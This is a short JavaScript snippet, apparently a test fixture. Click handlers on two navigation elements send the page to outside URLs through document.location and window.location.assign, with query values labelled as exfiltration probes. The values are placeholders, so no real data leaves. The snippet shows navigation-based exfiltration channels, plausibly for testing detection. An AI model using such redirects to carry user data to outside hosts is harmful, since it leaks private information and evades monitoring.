document.getElementById('nav-doc-location')?.addEventListener('click', () => {
  document.location = 'https://duckduckgo.com/?q=exfil-via-document-location';
});
document.getElementById('nav-assign')?.addEventListener('click', () => {
  window.location.assign('https://example.com/?d=exfil-via-location-assign');
});
